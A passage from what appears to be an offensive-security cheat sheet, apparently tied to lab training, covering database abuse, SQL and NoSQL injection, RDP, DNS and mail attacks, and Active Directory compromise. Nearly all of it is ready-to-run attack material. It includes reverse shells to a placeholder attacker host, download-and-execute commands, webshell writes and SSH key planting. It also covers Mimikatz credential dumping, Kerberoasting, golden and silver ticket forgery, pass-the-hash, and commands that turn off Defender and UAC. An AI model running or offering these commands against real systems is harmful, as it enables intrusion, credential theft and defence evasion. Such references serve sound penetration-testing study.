SQL> reconfigure;
SQL> sp_configure;
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```

```shell
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

```shell
';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
```

#### Read/Write using OPENROWSET

```shell
SELECT * FROM OPENROWSET(BULK 'C:\PATH\TO\FILE\<FILE>', SINGLE_CLOB) AS x;
```

```shell
mysql -u root -p
mysql -u <USERNAME> -h <RHOST> -p
mysql -u <USERNAME> -h <RHOST> -p <PASSWORD>
```

```shell
mysql> STATUS;
mysql> SHOW databases;
mysql> USE <DATABASE>;
mysql> SHOW tables;
mysql> DESCRIBE <TABLE>;
mysql> SELECT version();
mysql> SELECT system_user();
mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;
musql> SELECT user, authentication_string FROM mysql.user WHERE user = '<USERNAME>';
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> SELECT LOAD_FILE('C:\\PATH\\TO\\FILE\\<FILE>');
mysql> SHOW GRANTS FOR '<USERNAME>'@'localhost' \G;
```

#### Update User Password

```shell
mysql> update user set password='<PASSWORD>' where user_id = 1;
```

#### Drop a Shell

```shell
mysql> \! /bin/sh
```

#### Insert Code to get executed

```shell
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```

#### Write SSH Key into authorized_keys2 file

```shell
mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

### RDP

```
nmap -Pn -p3389 192.168.2.143

# Crowbar and Hydra - RDP Password Spraying
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c '<PASSWORD>'
hydra -L usernames.txt -p '<PASSWORD>' 192.168.2.143 rdp

# RDP Login
rdesktop -u admin -p <PASSWORD> 192.168.2.143

# RDP Session Hijacking
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
query user
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack

# RDP Pass-the-Hash (PtH)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:192.168.220.152 /u:lewen /pth:<NTLM_HASH>

```

### DNS

```
nmap -p53 -Pn -sV -sC 10.10.110.213

# DNS Zone Transfer - DIG - AXFR Zone Transfer
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
fierce --domain zonetransfer.me

# Domain Takeovers & Subdomain Enumeration
./subfinder -d inlanefreight.com -v

git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
python3 subbrute.py inlanefreight.htb -s names.txt -r resolvers.txt

host support.inlanefreight.com

# Reference: https://github.com/EdOverflow/can-i-take-over-xyz

# DNS Spoofing
> cat /etc/ettercap/etter.dns  >>> to be >>> targetdomain.io	A	Attacker_IP
> Start Ettercap
> navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.
> Activate dns_spoof attack by navigating to Plugins > Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110:
> After a successful DNS spoof attack, if a victim user coming from the target machine 192.168.152.129 visits the inlanefreight.com domain on a web browser, they will be redirected to a Fake page that is hosted on IP address 192.168.225.110:

> ping inlanefreight.com

```

### Email (SMTP & POP3)

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

# MX records
host -t MX microsoft.com
dig mx inlanefreight.com | grep "MX" | grep -v ";"

# A record for a mail host
host -t A mail1.inlanefreight.htb.

# SMTP interaction — VRFY, EXPN, RCPT TO, USER
telnet 10.10.110.20 25

# SMTP user enumeration with RCPT
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

# Cloud mail services: o365spray (O365), MailSniper (O365), CredKing (Gmail/Okta)
python3 o365spray.py --validate --domain msplaintext.xyz
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
python3 o365spray.py --spray -U usersfound.txt -p '<PASSWORD>' --count 1 --lockout 1 --domain msplaintext.xyz

# POP3 brute force
hydra -L users.txt -p '<PASSWORD>' -f 10.10.110.20 pop3

# SMTP open relay
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
swaks --from <EMAIL> --to <EMAIL> --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
```

### impacket-mssqlclient

#### Common Commands

```shell
enum_logins
enum_impersonate
```

#### Connection

```shell
impacket-mssqlclient <USERNAME>@<RHOST>
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
impacket-mssqlclient -k -no-pass <RHOST>
impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
```

```shell
export KRB5CCNAME=<USERNAME>.ccache
impacket-mssqlclient -k <RHOST>.<DOMAIN>
```

### MongoDB

```shell
mongo "mongodb://localhost:27017"
```

```shell
> use <DATABASE>;
> show tables;
> show collections;
> db.system.keys.find();
> db.users.find();
> db.getUsers();
> db.getUsers({showCredentials: true});
> db.accounts.find();
> db.accounts.find().pretty();
> use admin;
```

#### User Password Reset to "12345"

```shell
> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "<BCRYPT_HASH>" } } } })
```

### NoSQL Injection

```shell
admin'||''==='
{"username": {"$ne": null}, "password": {"$ne": null} }
```

### PostgreSQL

```shell
psql
psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```

**Common Commands**

```shell
postgres=# \list                     // list all databases
postgres=# \c                        // use database
postgres=# \c <DATABASE>             // use specific database
postgres=# \s                        // command history
postgres=# \q                        // quit
<DATABASE>=# \dt                     // list tables from current schema
<DATABASE>=# \dt *.*                 // list tables from all schema
<DATABASE>=# \du                     // list users roles
<DATABASE>=# \du+                    // list users roles
<DATABASE>=# SELECT user;            // get current user
<DATABASE>=# TABLE <TABLE>;          // select table
<DATABASE>=# SELECT usename, passwd from pg_shadow;                         // read credentials
<DATABASE>=# SELECT * FROM pg_ls_dir('/'); --                               // read directories
<DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --    // read a file
```

#### Postgres Remote Code Execution

```shell
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
<DATABASE>=# SELECT * FROM cmd_exec;
```

```shell
<DATABASE>=# COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f';
<DATABASE>=# COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
<DATABASE>=# COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';"
```

### Redis

```shell
> AUTH <PASSWORD>
> AUTH <USERNAME> <PASSWORD>
> INFO SERVER
> INFO keyspace
> CONFIG GET *
> SELECT <NUMBER>
> KEYS *
> GET
> HSET       // set value if a field within a hash data structure
> HGET       // retrieves a field and his value from a hash data structure
> HKEYS      // retrieves all field names from a hash data structure
> HGETALL    // retrieves all fields and values from a hash data structure
> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";" # the value "s:8" has to match the length of the username
```

#### Enter own SSH Key

```shell
redis-cli -h <RHOST>
echo "FLUSHALL" | redis-cli -h <RHOST>
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key
<RHOST>:6379> get s-key
<RHOST>:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
<RHOST>:6379> CONFIG SET dbfilename authorized_keys
<RHOST>:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"
<RHOST>:6379> save
```

### Common Injections

#### MySQL & MariaDB

#### Get Number of Columns

```shell
-1 order by 3;#
```

#### Get Version

```shell
-1 union select 1,2,version();#
```

#### Get Database Name

```shell
-1 union select 1,2,database();#
```

#### Get Table Name

```shell
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
```

#### Get Column Name

```shell
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
```

#### Read a File

```shell
SELECT LOAD_FILE('/etc/passwd')
```

#### Dump Data

```shell
-1 union select 1,2, group_concat(<COLUMN>) from <DATABASE>.<TABLE>;#
```

#### Create Webshell

```shell
LOAD_FILE('/etc/httpd/conf/httpd.conf')
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/<FILE>.php";
```

```shell
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
```

#### MSSQL

#### Authentication Bypass

```shell
' or 1=1--
```

#### Get Version with Time-Based Injection

```shell
' SELECT @@version; WAITFOR DELAY '00:00:10'; —
```

#### Enable xp_cmdshell

```shell
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

#### Remote Code Execution (RCE)

```shell
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--
```

#### Orcale SQL

**Authentication Bypass**

**Get Number of Columns**

```shell
' order by 3--
```

**Get Table Name**

```shell
' union select null,table_name,null from all_tables--
```

**Get Column Name**

```shell
' union select null,column_name,null from all_tab_columns where table_name='<TABLE>'--
```

**Dump Data**

```shell
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
```

#### SQLite

#### Extracting Table Names

```shell
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```

#### Extracting User Table

```shell
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
```

#### Error-based SQL Injection (SQLi)

```shell
<USERNAME>' OR 1=1 -- //
```

Results in:

```shell
SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
```

```shell
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

#### UNION-based SQL Injection (SQLi)

#### Manual Injection Steps

```shell
$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

```shell
' ORDER BY 1-- //
```

```shell
%' UNION SELECT database(), user(), @@version, null, null -- //
```

```shell
' UNION SELECT null, null, database(), user(), @@version  -- //
```

```shell
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
```

```shell
' UNION SELECT null, username, password, description, null FROM users -- //
```

#### Blind SQL Injection (SQLi)

```shell
http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
```

```shell
http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
```

### SQLite3

```shell
sqlite3 <FILE>.db
```

```shell
sqlite> .tables
sqlite> PRAGMA table_info(<TABLE>);
sqlite> SELECT * FROM <TABLE>;
```

### sqsh (MSSQL)

```shell
sqsh -S <RHOST> -U <USERNAME>
sqsh -S '<RHOST>' -U '<USERNAME>' -P '<PASSWORD>'
sqsh -S '<RHOST>' -U '.\<USERNAME>' -P '<PASSWORD>'
```

#### List Files and Folders with xp_dirtree

```shell
EXEC master.sys.xp_dirtree N'C:\inetpub\wwwroot\',1,1;
```

## 10. Active Directory

### Initial Enumeration

```
# Dump credentials with Mimikatz:
.\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Responder
sudo responder -I ens224 -A

# Inveigh
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
# OR
.\Inveigh.exe
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES

# Performs a ping sweep on the specified network segment from a Linux-based host
fping -asgq 172.16.5.0/23

# Enumerate usernames with Kerbrute against the domain and DC, writing results to a file.
./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
```

#### Manual Enumeration

```cmd
net user /domain
net user <USERNAME> /domain
net group /domain
net group "<GROUP>" /domain
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Find-LocalAdminAccess
Get-NetSession -ComputerName <RHOST>
Get-NetSession -ComputerName <RHOST> -Verbose
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

#### Enumeration using PowerView

```cmd
. .\PowerUp.ps1
Get-NetDomain
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "<GROUP>" | select member
Convert-SidToName S-1-5-21-1987370373-658406905-1781884369-1104
```

#### Service Principal Name (SPN) Enumeration

```cmd
setspn -L iis_service
Get-NetUser -SPN | select samaccountname,serviceprincipalname
nslookup.exe <RHOST>
```

#### Object Permission Enumeration

| Permission | Description |
| GenericAll | Full permissions on object |
| GenericWrite | Edit certain attributes on the object |
| WriteOwner | Change ownership of the object |
| WriteDACL | Edit ACE's applied to object |
| AllExtendedRights | Change password, reset password, etc. |
| ForceChangePassword | Password change for object |
| Self (Self-Membership) | Add ourselves to for example a group |

```cmd
Get-ObjectAcl -Identity <USERNAME>
Get-ObjectAcl -Identity "<GROUP>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
net group "<GROUP>" <USERNAME> /add /domain
net group "<GROUP>" <USERNAME> /del /domain
```

#### Share Enumeration

```cmd
Find-DomainShare
ls \\<RHOST>\sysvol\<DOMAIN>\
ls \\<RHOST>\sysvol\<DOMAIN>\Policies\
cat \\<RHOST>\sysvol\<DOMAIN>\Policies\oldpolicy\old-policy-backup.xml
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vgepPfsN1zMFTiQuyApgR92JE"
```

#### Credential Harvesting

#### Cached Credentials

```cmd
mimikatz # sekurlsa::logonpasswords
dir \\<RHOST>\<SHARE>
mimikatz # sekurlsa::tickets
```

**AS-REP Roasting**

```shell
impacket-GetNPUsers -dc-ip <RHOST> -request -outputfile hashes.asreproast <DOMAIN>/<USERNAME>
hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

```cmd
.\Rubeus.exe asreproast /nowrap
hashcat -m 18200 hashes.asreproast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

**Kerberoasting**

```shell
impacket-GetUserSPNs -dc-ip <RHOST> -request <DOMAIN>/<USERNAME>
hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

```cmd
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
hashcat -m 13100 hashes.kerberoast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

#### Timeroasting

> github.com/SecuraBV/Timeroast

#### Script Modification

```python
  argparser.add_argument('hashes', type=FileType('r'), help='Output of timeroast.py')
  argparser.add_argument('dictionary', type=FileType('r'), help='Line-delimited password dictionary')
```

```python
  argparser.add_argument('hashes', type=lambda f: open(f, 'r', encoding='latin-1'), help='Output of timeroast.py')
  argparser.add_argument('dictionary', type=lambda f: open(f, 'r', encoding='latin-1'), help='Line-delimited password dictionary')
```

#### Modified timecrack.py

```python
#!/usr/bin/env python3

"""Perform a simple dictionary attack against the output of timeroast.py. Necessary because the NTP 'hash' format
unfortunately does not fit into Hashcat or John right now.

Not even remotely optimized, but still useful for cracking legacy default passwords (where the password is the computer
name) or specific default passwords that are popular in an organisation.
"""

from binascii import hexlify, unhexlify
from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
from typing import TextIO, Generator, Tuple
import hashlib, sys, re

HASH_FORMAT = r'^(?P<rid>\d+):\$sntp-ms\$(?P<hashval>[0-9a-f]{32})\$(?P<salt>[0-9a-f]{96})$'

def md4(data : bytes) -> bytes:
  try:
    return hashlib.new('md4', data).digest()
  except ValueError:
    # Use pure-Python implementation by James Seo in case local OpenSSL does not support MD4.
    from md4 import MD4
    return MD4(data).bytes()

def compute_hash(password : str, salt : bytes) -> bytes:
  """Compute a legacy NTP authenticator 'hash'."""
  return hashlib.md5(md4(password.encode('utf-16le')) + salt).digest()


def try_crack(hashfile : TextIO, dictfile : TextIO) -> Generator[Tuple[int, str], None, None]:
  # Try each dictionary entry for each hash. dictfile is read iteratively while hashes are stored in RAM.
  hashes = []
  for line in hashfile:
    line = line.strip()
    if line:
      m = re.match(HASH_FORMAT, line)
      if not m:
        print(f'ERROR: invalid hash format: {line}', file=sys.stderr)
        sys.exit(1)
      rid, hashval, salt = m.group('rid', 'hashval', 'salt')
      hashes.append((int(rid), unhexlify(hashval), unhexlify(salt)))


  for password in dictfile:
    password = password.strip()
    for rid, hashval, salt in hashes:
      if compute_hash(password, salt) == hashval:
        yield rid, password

def main():
  argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
"""Perform a simple dictionary attack against the output of timeroast.py.

Not even remotely optimized, but still useful for cracking legacy default
passwords (where the password is the computer name) or specific default
passwords that are popular in an organisation.
""")

  argparser.add_argument('hashes', type=lambda f: open(f, 'r', encoding='latin-1'), help='Output of timeroast.py')
  argparser.add_argument('dictionary', type=lambda f: open(f, 'r', encoding='latin-1'), help='Line-delimited password dictionary')
  args = argparser.parse_args()

  crackcount = 0
  for rid, password in try_crack(args.hashes, args.dictionary):
    print(f'[+] Cracked RID {rid} password: {password}')
    crackcount += 1

  print(f'\n{crackcount} passwords recovered.')

if __name__ == '__main__':
  main()

```

#### Execution

```shell
python3 timecrack.py <FILE> /PATH/TO/WORDLIST/<WORDLIST>
```

#### Silver Tickets

#### Prerequisites

- SPN password hash
- Domain SID
- Target SPN

#### Silver Ticket Forgery

```cmd
iwr -UseDefaultCredentials http://<RHOST>
whoami /user                   // SID: S-1-5-21-1987370270-658905905-1781884369-1105 (S-1-5-21-1987370270-658905905-1781884369)
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:<DOMAIN> /ptt /target:<RHOST> /service:http /rc4:<NTLM_HASH> /user:<USERNAME>
```

#### Domain Controller Synchronization (DCSync)

**Prerequisites**

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered

#### Domain Controller Synchonization Execution

```cmd
mimikatz # lsadump::dcsync /user:<DOMAIN>\<USERNAME>
mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator
hashcat -m 1000 <FILE> /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
```

```shell
impacket-secretsdump -just-dc-user <USERNAME> <DOMAIN>/<USERNAME>:"<PASSWORD>"@<RHOST>
```

#### Lateral Movement

#### Windows Management Instrumentation (WMI)

#### Spawning Process

```cmd
wmic /node:<RHOST> /user:<USERNAME> /password:<PASSWORD> process call create "cmd"
```

#### Store Credentials

```cmd
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

#### Instanciate Distributed Component Object MOdel (DCOM)

```cmd
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <RHOST> -Credential $credential -SessionOption $Options
$command = 'cmd';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

#### Creating Payload

#### revshell_encoder.py

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

#### Payload Encoding

```shell
python3 encode.py
```

```cmd
powershell -nop -w hidden -e JAB<--- SNIP --->CkA
```

**Execution**

```cmd
$command = 'powershell -nop -w hidden -e JAB<--- SNIP --->CkA';
```

#### Windows Remote Shell (WinRS)

**Prerequisites**

- User needs to be part of the Administrators or Remote Management Users group on the target host

**Execution**

```cmd
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "cmd /c hostname & whoami"
winrs -r:<RHOST> -u:<USERNAME> -p:<PASSWORD> "powershell -nop -w hidden -e JAB<--- SNIP --->CkA"
```

#### PowerShell

```cmd
New-PSSession -ComputerName <RHOST> -Credential $credential
Enter-PSSession 1
```

#### PsExec

```cmd
.\PsExec64.exe -i \\<RHOST> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
```

#### Pass the Hash (PtH)

```shell
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@<RHOST>
```

#### Overpass the Hash

```cmd
mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell
.\PsExec.exe \\<RHOST> cmd
```

#### Pass the Ticket

**Prerequisites**

- Export an already existing ticket of a user

#### Exporting the Ticket

```cmd
dir *.kirbi
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-<USERNAME>@cifs-<RHOST>.kirbi
```

#### Distributed Component Object Model (DCOM)

**Prerequisites**

- Elevated PowerShell session

#### Creating and storing the Distributed Component Object Model

```cmd
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<RHOST>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c cmd","7")
tasklist | findstr "cmd"
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JAB<--- SNIP --->CkA","7")
```

#### Active Directory Persistence

#### Golden Tickets

**Prerequisites**

- Hash of krbtgt

#### Forge and Inject Golden Ticket

```cmd
mimikatz # lsadump::lsa /patch
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:<NTLM_HASH> /ptt
```

**Execution**

Use the `hostname` and not the `IP address` because otherwise it would authenticate via `NTLM` and the access would still be blocked.

#### Volume Shadow Service (VSS) aka Shadow Copies

> https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/

#### Create and collect necessary Files

```cmd
vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
reg.exe save hklm\system C:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

### LLMNR/NBT-NS Poisoning

```
# Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

```
responder -I eth0 -rdwv #Credential default capture settings
```

### Password Spraying & Password Policy

```
# Uses CME to extract password policy
crackmapexec smb 172.16.5.5 -u avazquez -p <PASSWORD> --pass-pol

# Uses rpcclient to discover information about the domain through SMB NULL sessions. Performed from a Linux-based host.
rpcclient -U "" -N 172.16.5.5

# Uses rpcclient to enumerate the password policy in a target Windows domain from a Linux-based host.
rpcclient $> querydominfo

# Using enum4linux
enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA ilfreight

# Using Enumerating Null Session - from Windows | see the different responses for different usernames.
net use \\DC01\ipc$ "" /u:""
net use \\DC01\ipc$ "<PASSWORD>" /u:guest

# Uses ldapsearch to enumerate the password policy in a target Windows domain from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Used to enumerate the password policy in a Windows domain from a Windows-based host.
net accounts

# PowerView Command used to enumerate the password policy in a target Windows domain from a Windows-based host.
import-module .\PowerView.ps1
Get-DomainPolicy

# Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.
rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser

# Using enum4linux to implement null session to extract users
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Uses CrackMapExec to discover users (--users) in a target Windows domain from a Linux-based host.
crackmapexec smb 172.16.5.5 --users
# OR
# crackmapexec to check the valid credentials for  Domain User Enumeration
sudo crackmapexec smb 172.16.5.5 -u htb-student -p <PASSWORD> --users

# Uses ldapsearch to discover users in a target Windows doman, then filters the output using grep to show only the sAMAccountName from a Linux-based host.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# Using Rpcclient a Bash one-liner for the Attack.
for u in $(cat valid_users.txt);do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" 172.16.5.5 | grep Authority; done

# Uses kerbrute and a list of users (valid_users.txt) to perform a password spraying attack against a target Windows domain from a Linux-based host.
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt <PASSWORD>

# Using CrackMapExec & Filtering Logon Failures
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p <PASSWORD> | grep +
sudo crackmapexec smb 172.16.5.5 -u avazquez -p <PASSWORD>

# Uses CrackMapExec and the --local-auth flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using grep.
sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H <NTLM_HASH> | grep +

# Performs a password spraying attack and outputs (-OutFile) the results to a specified file (spray_success) from a Windows-based host.
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <PASSWORD> -OutFile spray_success -ErrorAction SilentlyContinue
```

### Enabling & Bypassing Security Controls

```
whoami
whoami /groups

# Checking the Status of Defender with Get-MpComputerStatus
Get-MpComputerStatus

# Check if Defender is enabled
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled, AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected, RealTimeProtectionEnabled | FL

# Check for alternative AV products
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
# Check whether this computer is part of a domain
(Get-CimInstance Win32_ComputerSystem).PartOfDomain
# Get the domain this computer belongs to
(Get-CimInstance Win32_ComputerSystem).Domain

# Disabling UAC
cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"

# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behavior monitoring
Set-MpPreference -DisableBehaviorMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MpPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MpPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MpPreference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"

# Turn off everything and set exclusion to "C:\Windows\Temp"
